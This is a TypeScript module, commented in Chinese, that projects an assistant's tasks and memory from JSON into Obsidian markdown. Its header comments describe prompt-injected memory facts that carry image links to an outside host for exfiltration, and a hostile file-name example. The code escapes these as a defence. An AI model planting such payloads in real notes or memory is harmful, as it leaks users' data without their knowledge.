/**
 * obsidian-projection.ts — 把 JSON 真相投影成人能在 Obsidian 里直接读的 md
 * (HANDS-M5)。
 *
 * `<ownerDir>/` 本来就能被 Obsidian 当 vault 打开:`knowledge/` 已经是一棵 md
 * 树(LIB-M2)、`STATUS.md` 已经在。缺的是另外两块——**任务**在 `tasks.json`
 * 里、**长期记忆**在 `semantic.jsonl` 里,两个都是机器格式,人打开 vault 一个
 * 字也看不见。这个模块补上 `tasks.md` 与 `memory/<cluster>.md`。
 *
 * # 真相仍是 JSON(用户拍板的岔口 4:「md 投影层、JSON 仍是真相」)
 *
 * 投影是**派生物**:删掉能重建,人手改了下次写入就覆盖。这句话不只写在散文
 * 里——每个投影文件 frontmatter 第一行就是 `generated: true`,正文第一句讲清
 * 覆盖语义。反方向同样是硬的:**投影永远不是输入**,全仓没有任何一条读路径会
 * 从这些 md 读回 JSON(它们只被人和 Obsidian 读)。
 *
 * # 三条承重判断
 *
 * ① **投影里的时间戳只能来自真相自身,绝不来自 `Date.now()`**。投影每 6h 兜底
 *    重写一次;只要正文里塞一个墙上时钟,MU-M5 的记忆树 git 快照就会**每一次
 *    tick 都看到 diff**,于是把「什么都没变」渲染成「变了」,一年下来 1400 个
 *    空 commit 埋掉真正的改动。所以本文件**一个 `Date.now` 都不出现**(源码级
 *    断言钉死):要判「这条事实现在还成不成立」的 `now` 由调用方传进来,它只用来
 *    **选**哪些条目进得来,永远不进输出字节。同一份真相渲染两次必须逐字节相同。
 *
 * ② **文件名只能来自闭集**。`meta.tier` 是蒸馏模型写的自由字符串——直接拿它拼
 *    路径,一次幻觉就能写到 `memory/../../` 去。故 cluster 一律先过
 *    `normalizeTier` 落回目录里的已知 id,再过一道 id 形状校验;不合形状的
 *    cluster 直接跳过并 warn,绝不「尽力拼一个」。
 *
 * ③ **链只指真实存在的文件**。`[[knowledge/…]]` 只在这个成员的知识库里**真的
 *    有那个文件**时才生成,指不到就原样留着文字——与 M3b 那条「指一条可能不存在
 *    的路,比说『这儿干不了』更坏」同一形状:Obsidian 里一个死链会诱人去新建一个
 *    本不该存在的笔记。**文件名本身也要能被链表达**:名字里带 `[` `]` `|` `#`
 *    `^` 的文件在 wiki 链语法里根本写不出来,硬拼只会拼出一条指向别处的链,故这
 *    类文件不进链表(它照样读得到,只是不自动连)。
 *
 * ④ **正文里的自由文本一律先中和 markdown**(Codex 轮 C H1)。判断 ③ 管的是
 *    「我们生成的链」,管不了「别人写进正文的链」——而正文来自模型,模型读的是
 *    IM 消息 / 搜索结果 / MCP 输出这些**可被注入的**东西。一条被注入的事实只要
 *    含 `![](https://外面/x?带走的东西)`,成员在 Obsidian 里打开 vault 的那一刻
 *    浏览器就替它把请求发出去了——那是一条绕过 hub 全部出网边界的外带通道(发
 *    请求的是成员自己的机器)。`%%…%%` 则相反:它让一条事实在阅读视图里**看不
 *    见**,而这个投影存在的全部理由就是「让人看见阿同记得什么」。故自由文本进
 *    正文前一律过 {@link mdSafe}:`[` `]` `<` `>` `` ` `` `\` 恒转义,`%` 只在成
 *    对时转义。刻意不管 `*` `_` `~~` `$`——那些是观感不是安全,而转义它们会把
 *    每一份投影都写满反斜杠。
 *
 * # frontmatter 里不放自由文本
 *
 * frontmatter 的值只有布尔、整数和固定标识符。任何一个带冒号的任务标题塞进去
 * 都会把 YAML 撑坏,而 Obsidian 解析失败时是**整块 frontmatter 消失**——里程碑
 * 要的「投影可 Obsidian 解析」会以最安静的方式失效。自由文本一律进正文。
 *
 * # 零 LLM;失败绝不打断真相
 *
 * 纯渲染 + 写文件,没有模型调用。写投影失败只 warn:真相已经落盘了,派生物写不
 * 出来不该让成员的一次任务编辑失败(与 STATUS.md 同姿态)。
 */

import { lstat, mkdir, readFile, rm, rmdir } from 'node:fs/promises'
import { join } from 'node:path'

import { writeFileAtomic } from '@gotong/core'
import {
  DEFAULT_TIERS,
  isActive,
  isAtomicFact,
  levelOf,
  normalizeTier,
  tierOf,
  type TierConfig,
  type TierSpec,
} from '@gotong/personal-memory'
import type { MemoryEntry } from '@gotong/services-sdk'

import type { TaskNote } from './task-notebook.js'

/** 任务投影的文件名(相对 vault 根 = `<ownerDir>`)。 */
export const TASKS_PROJECTION_FILE = 'tasks.md'

/** 记忆投影的目录名(相对 vault 根);每个 cluster 一个 `<id>.md`。 */
export const MEMORY_PROJECTION_DIR = 'memory'

/** 显式上限——超了如实说「还有 N 条没列」,绝不静默截断。 */
export const OBSIDIAN_PROJECTION_LIMITS = {
  /** 「已收起」那节最多列几条(进行中的一条不漏)。 */
  maxClosedTasks: 30,
  /** 每个 cluster 最多列几条事实。 */
  maxFactsPerTier: 200,
  /** 单条事实正文的字符上限(投影是给人扫一眼的,不是数据导出)。 */
  maxFactChars: 300,
  /** 链接表规模上限(知识库自己有 200 件顶,这里是纵深防御)。 */
  maxLinkEntries: 600,
} as const

/** cluster id → 文件名,只认这个形状(判断 ② 的第二道)。 */
const SAFE_TIER_ID_MAX = 32

export interface ObsidianProjectionLogger {
  warn(msg: string, meta?: Record<string, unknown>): void
}

export interface ObsidianProjector {
  /** 重写 `tasks.md`。永不抛——失败只 warn。 */
  projectTasks(tasks: readonly TaskNote[]): Promise<void>
  /**
   * 重写 `memory/<cluster>.md`。`now` 只用来判某条事实的有效区间还开不开着,
   * 永远不进输出字节(判断 ①)。永不抛。
   */
  projectMemory(
    entries: readonly MemoryEntry[],
    now: number,
    opts?: { readonly windowed?: boolean },
  ): Promise<void>
  /**
   * 删掉全部记忆投影(「忘掉全部」要连派生物一起清,否则投影替 jsonl 撒谎)。
   *
   * **这一件会抛**——与本模块其余「永不抛」相反,理由见实现处:删不掉的那份 md
   * 和 jsonl 一样读得到,吞掉失败等于把一句「已经忘了」说成谎话。
   */
  removeMemoryProjections(): Promise<void>
}

export interface OpenObsidianProjectorOptions {
  /** vault 根 = 这个成员的 `ownerDir`(host 解析,本模块不碰 userId)。 */
  dir: string
  /**
   * 解析这个成员知识库里**现有**的文件路径(相对 `knowledge/`),给 `[[…]]` 链
   * 用。缺席或抛错 ⇒ 这一次不连链,绝不失败(判断 ③ 的降级半边)。
   */
  knowledgeFiles?: () => Promise<readonly string[]>
  /** cluster 目录;默认 {@link DEFAULT_TIERS}。 */
  tierConfig?: TierConfig
  logger?: ObsidianProjectionLogger
}

// ---------------------------------------------------------------------------
// 纯渲染
// ---------------------------------------------------------------------------

/** 一条候选链:在正文里看到 `token` 就换成 `link`。 */
interface KnowledgeLink {
  token: string
  link: string
}

/** wiki 链前缀:vault 根就是 `<ownerDir>`,知识树在它下面。 */
const MEMORY_LINK_PREFIX = 'knowledge/'

/** 文件名里出现这些就没法被 `[[…]]` 表达(它们是链语法自己的定界符)。 */
const LINK_HOSTILE = /[[\]|#^]/

/**
 * 从知识库现有文件建链接表。归档件(`archive/` 前缀)**不进表**——投影里的链
 * 是「现在还在架上的东西」,指向归档件会把人带去一个已经被收起来的版本。
 * 按 token 长度降序,使 `knowledge/x.md` 永远先于 `x.md` 命中(最长匹配)。
 */
export function buildKnowledgeLinkTable(files: readonly string[]): KnowledgeLink[] {
  const out: KnowledgeLink[] = []
  for (const p of files) {
    if (typeof p !== 'string' || !p.endsWith('.md') || p.startsWith('archive/')) continue
    // 知识库的路径校验挡住了控制字符/冒号/反斜杠,但**没挡** `[` `]` `|` `#` `^`
    // ——而这五个正是 wiki 链语法自己的定界符。`evil]] ![](http://x) [[.md` 是一
    // 个合法的知识文件名,拼进 `[[…]]` 就成了一条真的图片链。链表达不出来的名字
    // 就不连(判断 ③ 的直接推论:指不准,就不指)。
    if (LINK_HOSTILE.test(p)) continue
    if (out.length >= OBSIDIAN_PROJECTION_LIMITS.maxLinkEntries) break
    const link = `[[${MEMORY_LINK_PREFIX}${p.slice(0, -3)}]]`
    out.push({ token: `${MEMORY_LINK_PREFIX}${p}`, link })
    out.push({ token: p, link })
  }
  out.sort((a, b) => b.token.length - a.token.length || (a.token < b.token ? -1 : 1))
  return out
}


/**
 * 把正文里出现的知识文件路径换成 Obsidian wiki 链。一次线性扫描 + 最长匹配,
 * **不用正则**:候选里全是成员自己起的文件名(中文、括号、加号都可能有),正则
 * 转义漏一个字符就是一次静默的错误替换。
 */
export function linkifyKnowledgePaths(text: string, table: readonly KnowledgeLink[]): string {
  if (table.length === 0 || text.length === 0) return text
  let out = ''
  let i = 0
  while (i < text.length) {
    let hit: KnowledgeLink | undefined
    for (const e of table) {
      if (text.startsWith(e.token, i)) {
        hit = e
        break
      }
    }
    if (hit) {
      out += hit.link
      i += hit.token.length
    } else {
      out += text[i]
      i += 1
    }
  }
  return out
}

/**
 * 把自由文本压成**一行**:控制字符换空格、空白折叠、超长截断。
 *
 * 「一行」是结构性的:一条被注入的事实如果能带着换行进来,它就能在投影里伪造
 * 出一个 `## 事实` 小节,让人在 Obsidian 里读到框架从没写过的段落。压成一行 +
 * 前面永远有 `- ` 之后,自由文本再也长不出结构。
 */
export function oneLine(raw: string, maxChars: number): string {
  let out = ''
  let space = false
  for (const ch of raw) {
    const code = ch.codePointAt(0) ?? 0
    // 数值比较而不是字面量:0xa0/0x3000 这类空白写进源码是**看不见的字节**,
    // 一次复制粘贴就能把它们弄丢而没有人会发现。
    const blank =
      code < 0x20 || code === 0x7f || code === 0x20 || code === 0xa0 || code === 0x3000
    if (blank) {
      space = out.length > 0
      continue
    }
    if (space) {
      out += ' '
      space = false
    }
    out += ch
  }
  const chars = [...out]
  return chars.length > maxChars ? `${chars.slice(0, maxChars).join('')}…` : out
}

/** epoch ms → `YYYY-MM-DD`(UTC 日;与用量图表同一条诚实纪律,日界不偷偷跟着时区跑)。 */
function ymd(ts: number): string {
  if (!Number.isFinite(ts)) return '(时间未知)'
  return new Date(ts).toISOString().slice(0, 10)
}

function frontmatter(fields: readonly (readonly [string, string | number | boolean])[]): string[] {
  // 值只有布尔/整数/固定标识符——自由文本永远不进 frontmatter(见头注)。
  return ['---', ...fields.map(([k, v]) => `${k}: ${String(v)}`), '---', '']
}

/** 任务投影:`tasks.json` → `tasks.md`。纯函数,同样输入恒同样字节。 */
export function renderTasksProjection(
  tasks: readonly TaskNote[],
  links: readonly KnowledgeLink[] = [],
): string {
  const open = tasks.filter((t) => t.status === 'open')
  const closed = tasks.filter((t) => t.status !== 'open')
  const lines: string[] = [
    ...frontmatter([
      ['generated', true],
      ['source', 'tasks.json'],
      ['open', open.length],
      ['closed', closed.length],
    ]),
    '# 任务',
    '',
    '> 只读投影:真相在 `tasks.json`。改这个文件不会改任何东西——阿同下次动任务时会把它整个重写。要改内容,跟阿同说一声。',
    '',
    '## 进行中',
    '',
  ]
  if (open.length === 0) {
    lines.push('_(现在没有进行中的任务)_', '')
  }
  for (const t of open) {
    lines.push(`### ${text(t.title, links, 120)}`, '')
    lines.push(`\`${t.id}\` · 更新于 ${ymd(t.updatedAt)}(UTC)`, '')
    for (const s of t.steps) {
      lines.push(`- [${s.done ? 'x' : ' '}] ${text(s.text, links, 200)}`)
    }
    if (t.steps.length > 0) lines.push('')
    if (t.note && t.note.length > 0) {
      lines.push(`备注:${text(t.note, links, 500)}`, '')
    }
  }
  lines.push('## 已收起', '')
  if (closed.length === 0) {
    lines.push('_(还没有收起来的任务)_', '')
  }
  // 笔记本的 `list()` 按 createdAt **升序**给(open 在前)。直接 slice 会留下**最
  // 老的 30 条**,而下面那句写的是「还有 N 条更早的没有列出」——正好说反。收起来
  // 的任务里,人要找的是刚做完的那几件,故这里按 updatedAt 倒序取。
  const shown = [...closed]
    .sort((a, b) => b.updatedAt - a.updatedAt || (a.id < b.id ? -1 : 1))
    .slice(0, OBSIDIAN_PROJECTION_LIMITS.maxClosedTasks)
  for (const t of shown) {
    const mark = t.status === 'done' ? '已完成' : '已放弃'
    lines.push(`- ${mark} · \`${t.id}\` ${text(t.title, links, 120)} · ${ymd(t.updatedAt)}`)
  }
  if (closed.length > shown.length) {
    lines.push('', `_(还有 ${closed.length - shown.length} 条更早的没有列出——完整记录在 \`tasks.json\`)_`)
  }
  lines.push('')
  return `${lines.join('\n').replace(/\n{3,}/g, '\n\n').trimEnd()}\n`
}

/**
 * 中和自由文本里的 markdown/Obsidian 语法(判断 ④)。**单扫,不用正则**——与
 * {@link linkifyKnowledgePaths} 同一纪律。
 *
 * 恒转义 `\\` `[` `]` `<` `>` `` ` ``:这五个关掉的是 wiki 链、嵌入(`![[…]]`)、
 * md 链与图片(`![](…)`)、裸 HTML、以及把后面那截 `\`id\` · 日期` 吞进代码段。
 * `%` **只在成对时**转义:`%%…%%` 是 Obsidian 的注释语法(阅读视图里整段消失),
 * 而单个 `%` 在中文正文里很常见(「完成度 80%」),一律转义会把投影写满反斜杠。
 *
 * 「成对才转」为什么够:一个 `%` 只有在**下一个输入字符不是 `%`** 时才原样输出,
 * 所以输出里任何一个未转义 `%` 的后一个字符必然不是 `%` —— 输出里不可能再出现
 * 未转义的 `%%`。
 *
 * 转义用的反斜杠是 CommonMark 的 ASCII 标点转义,渲染出来就是字符本身;代价是
 * 源码视图里看得见那根反斜杠。投影是机器写的只读派生物,这个代价认。
 */
export function mdSafe(raw: string): string {
  const chars = [...raw]
  let out = ''
  for (let i = 0; i < chars.length; i++) {
    const ch = chars[i] as string
    if (ch === '%') {
      // 只转义**成对**的那种(`%%` 是 Obsidian 的注释定界符,会把整段藏起来),
      // 单个 `%` 原样留着 —— 「完成度 80%」每天都出现,把它写成 `80\%` 是让
      // 每一份投影都变脏。判据取「左右任一邻居是 %」而不是「下一个是 %」:
      // 后者对 `%%%` 会漏掉末尾那个,拼出来仍有一对相邻的裸 `%`。
      // 这条规则一句话可证:裸 `%` 只在两侧邻居都不是 `%` 时才输出 ⇒ 输出里
      // 不可能出现两个相邻的裸 `%`。
      const paired = chars[i - 1] === '%' || chars[i + 1] === '%'
      out += paired ? '\\%' : '%'
      continue
    }
    out += ESCAPE_ALWAYS.has(ch) ? `\\${ch}` : ch
  }
  return out
}

const ESCAPE_ALWAYS: ReadonlySet<string> = new Set(['\\', '[', ']', '<', '>', '`'])

/**
 * 自由文本进正文的**唯一**通道:折成一行 → 中和语法 → 再连库内链。
 *
 * 顺序是承重的:中和必须在 linkify **之前**(否则会把我们自己刚生成的 `[[…]]`
 * 一起转义掉),也必须在 oneLine **之后**(截断按码点切,不会把一个转义序列劈开)。
 */
function text(raw: string, links: readonly KnowledgeLink[], maxChars: number): string {
  return linkifyKnowledgePaths(mdSafe(oneLine(raw, maxChars)), links)
}

/** 一条事实的出处标签——只从 meta 的结构化位读,不猜。 */
function provenance(e: MemoryEntry): string {
  const level = levelOf(e)
  if (level === 'profile') return '画像总结'
  if (level === 'digest') return '阶段摘要'
  if (isAtomicFact(e)) return '事实抽取'
  return '记录'
}

const GROUP_ORDER = ['画像总结', '阶段摘要', '事实抽取', '记录'] as const

/**
 * 一个 cluster 的记忆投影。`entries` 必须已经按 cluster 过滤且只含现在还成立
 * 的条目(过期/被替换掉的旧事实由调用方在 {@link planMemoryProjections} 里筛掉)。
 */
export function renderMemoryTierProjection(
  tier: Pick<TierSpec, 'id' | 'label'>,
  entries: readonly MemoryEntry[],
  opts: { readonly windowed?: boolean } = {},
): string {
  const sorted = [...entries].sort((a, b) => b.ts - a.ts || (a.id < b.id ? -1 : 1))
  const shown = sorted.slice(0, OBSIDIAN_PROJECTION_LIMITS.maxFactsPerTier)
  const lines: string[] = [
    ...frontmatter([
      ['generated', true],
      ['source', 'semantic.jsonl'],
      ['tier', tier.id],
      ['facts', shown.length],
    ]),
    `# ${mdSafe(oneLine(tier.label ?? tier.id, 120))}`,
    '',
    '> 只读投影:真相在 `semantic.jsonl`,改这个文件不会改阿同记得什么。这里只列**现在还成立**的事实——被后来的说法替换掉的旧事实不在这儿,但它们仍留在 jsonl 里(记忆不删只翻篇)。',
    '',
  ]
  for (const group of GROUP_ORDER) {
    const rows = shown.filter((e) => provenance(e) === group)
    if (rows.length === 0) continue
    lines.push(`## ${group}`, '')
    for (const e of rows) {
      lines.push(
        `- ${mdSafe(oneLine(e.text, OBSIDIAN_PROJECTION_LIMITS.maxFactChars))} · \`${e.id}\` · ${ymd(e.ts)}`,
      )
    }
    lines.push('')
  }
  if (sorted.length > shown.length) {
    lines.push(`_(还有 ${sorted.length - shown.length} 条没有列出——完整数据在 \`semantic.jsonl\`)_`, '')
  }
  if (opts.windowed) {
    // 上面那句只数**这个 cluster 内部**被截掉的。窗口是另一回事:调用方一次只
    // 读得到最新的 N 条事实(文件后端的 list 硬顶),更早的连进都没进来 —— 不说
    // 这一句,这份文件看起来就是完整的。
    lines.push('_(这次只读到最新的一批事实,更早的没有参与这次投影)_', '')
  }
  return `${lines.join('\n').trimEnd()}\n`
}

export interface MemoryProjectionPlan {
  /** cluster id(已过闭集与形状校验)。 */
  tierId: string
  /** 相对 vault 根的路径。 */
  file: string
  /** 要写的字节;`null` = 这个 cluster 现在一条都没有 ⇒ 删掉旧投影。 */
  body: string | null
}

/**
 * 把一堆 semantic 条目摊成「每个 cluster 写什么」。空掉的 cluster 产出
 * `body:null` ⇒ 调用方删文件:一个留在盘上的空投影会让人以为那些事实还在。
 */
export function planMemoryProjections(
  entries: readonly MemoryEntry[],
  now: number,
  config: TierConfig = DEFAULT_TIERS,
  logger?: ObsidianProjectionLogger,
  opts: { readonly windowed?: boolean } = {},
): MemoryProjectionPlan[] {
  const seen = new Set<string>()
  const byTier = new Map<string, MemoryEntry[]>()
  for (const e of entries) {
    if (e.kind !== 'semantic') continue
    if (!isActive(e, now)) continue // 已翻篇的旧事实不冒充现状
    const id = normalizeTier(config, tierOf(e, config.defaultTier))
    const bucket = byTier.get(id)
    if (bucket) bucket.push(e)
    else byTier.set(id, [e])
  }
  const plans: MemoryProjectionPlan[] = []
  for (const tier of config.tiers) {
    if (!isSafeTierId(tier.id)) {
      logger?.warn('obsidian projection: skipped a cluster whose id is not a safe filename', {
        tierId: tier.id,
      })
      continue
    }
    // id 即文件名 ⇒ 重复的 id 是两个 cluster 写同一个文件,后写的静默盖掉先写的。
    // 目录配坏了要看得见,不要表现成「那个 cluster 的事实少了一半」。
    if (seen.has(tier.id)) {
      logger?.warn('obsidian projection: duplicate cluster id, later one skipped', {
        tierId: tier.id,
      })
      continue
    }
    seen.add(tier.id)
    const rows = byTier.get(tier.id) ?? []
    if (rows.length === 0 && opts.windowed) {
      // 窗口不完整时「这个 cluster 一条都没有」是**分不出来**的:可能真空了,也
      // 可能它的事实全落在窗口外。删掉一份仍有真相的投影,比留下一份旧的更坏
      // ——留着的那份至少是曾经成立过的字节,删掉是让成员的 vault 凭空少一块。
      continue
    }
    plans.push({
      tierId: tier.id,
      file: `${MEMORY_PROJECTION_DIR}/${tier.id}.md`,
      body:
        rows.length > 0
          ? renderMemoryTierProjection(tier, rows, { ...(opts.windowed ? { windowed: true } : {}) })
          : null,
    })
  }
  return plans
}

/**
 * cluster id 能不能直接当文件名:只认小写字母/数字/`-`/`_`,长度有顶。判断 ②
 * 的第二道——`normalizeTier` 已经把未知值压回目录里了,这一道防的是目录本身
 * 被人配坏(自定义 `TierConfig`)。
 */
export function isSafeTierId(id: string): boolean {
  if (typeof id !== 'string' || id.length === 0 || id.length > SAFE_TIER_ID_MAX) return false
  for (const ch of id) {
    const c = ch.codePointAt(0) ?? 0
    const lower = c >= 0x61 && c <= 0x7a // a-z
    const digit = c >= 0x30 && c <= 0x39 // 0-9
    const dash = c === 0x2d || c === 0x5f // - _
    if (!lower && !digit && !dash) return false
  }
  return true
}

// ---------------------------------------------------------------------------
// 写盘
// ---------------------------------------------------------------------------

export function openObsidianProjector(opts: OpenObsidianProjectorOptions): ObsidianProjector {
  const config = opts.tierConfig ?? DEFAULT_TIERS

  /**
   * `memory/` 必须是真目录,不能是符号链接。
   *
   * 投影只写两个地方:vault 根下的 `tasks.md`(原子写 = tmp+rename,rename **替换**
   * 符号链接而不是穿过它,故文件这一层天生安全)和 `memory/<id>.md`。中间那一层
   * 目录是唯一能把写和删带出 vault 的缝:`memory` 若是一条指向别处的链接,
   * `mkdir -p` 会认它、tmp 文件会落在链接的那一头、`rm` 也会删那一头的东西。
   * 与知识库拒读符号链接同一姿态:不跟着走,响亮跳过。
   */
  const memoryDirOk = async (): Promise<boolean> => {
    try {
      const st = await lstat(join(opts.dir, MEMORY_PROJECTION_DIR))
      if (!st.isSymbolicLink()) return true
    } catch {
      return true // 还没有这个目录 —— 待会 mkdir 出来的必然是真目录
    }
    opts.logger?.warn('obsidian projection: memory/ is a symlink, refusing to write through it', {
      dir: opts.dir,
    })
    return false
  }

  /** 只在字节真的变了才写:没变就不动盘,git 快照/mtime 才不会被投影搅浑。 */
  const writeIfChanged = async (rel: string, body: string): Promise<void> => {
    const path = join(opts.dir, rel)
    let current: string | null = null
    try {
      current = await readFile(path, 'utf8')
    } catch {
      current = null // 还没有这个文件
    }
    if (current === body) return
    await mkdir(join(path, '..'), { recursive: true })
    await writeFileAtomic(path, body)
  }

  const linkTable = async (): Promise<KnowledgeLink[]> => {
    if (!opts.knowledgeFiles) return []
    try {
      return buildKnowledgeLinkTable(await opts.knowledgeFiles())
    } catch (err) {
      // 连不上链是降级,不是失败——投影照出,只是文字不带链。
      opts.logger?.warn('obsidian projection: knowledge listing unavailable, links skipped', {
        err: errMsg(err),
      })
      return []
    }
  }

  return {
    async projectTasks(tasks) {
      try {
        await writeIfChanged(TASKS_PROJECTION_FILE, renderTasksProjection(tasks, await linkTable()))
      } catch (err) {
        opts.logger?.warn('obsidian projection: tasks.md write failed', { err: errMsg(err) })
      }
    },

    async projectMemory(entries, now, memOpts) {
      try {
        if (!(await memoryDirOk())) return
        const plans = planMemoryProjections(entries, now, config, opts.logger, {
          ...(memOpts?.windowed ? { windowed: true } : {}),
        })
        for (const plan of plans) {
          if (plan.body === null) {
            await rm(join(opts.dir, plan.file), { force: true })
          } else {
            await writeIfChanged(plan.file, plan.body)
          }
        }
      } catch (err) {
        opts.logger?.warn('obsidian projection: memory/*.md write failed', { err: errMsg(err) })
      }
    },

    async removeMemoryProjections() {
      // **不吞异常**(Codex 轮 C H3)。本模块其余路径失败只 warn,因为投影是派生
      // 物、下一 tick 会自愈;这一条不一样:调用它的是「忘掉关于我的全部」,而删
      // 不掉的那份 md 与 jsonl 一样读得到。吞掉失败 = 成员收到一句「已经忘了」,
      // 而事实还在他的 vault 里摆着。抛出去让 /me 如实报错;重试是幂等的。
      if (!(await memoryDirOk())) {
        throw new Error(`memory/ 是一条符号链接,拒绝经它删除:${join(opts.dir, MEMORY_PROJECTION_DIR)}`)
      }
      for (const tier of config.tiers) {
        if (!isSafeTierId(tier.id)) continue
        await rm(join(opts.dir, MEMORY_PROJECTION_DIR, `${tier.id}.md`), { force: true })
      }
      // 目录可能还装着别的东西(人自己放的笔记),非空就留着 —— 这一条的失败是
      // **预期内**的(ENOTEMPTY),不该把一次成功的遗忘变成错误。
      await rmdir(join(opts.dir, MEMORY_PROJECTION_DIR)).catch(() => undefined)
    },
  }
}

function errMsg(err: unknown): string {
  return err instanceof Error ? err.message : String(err)
}
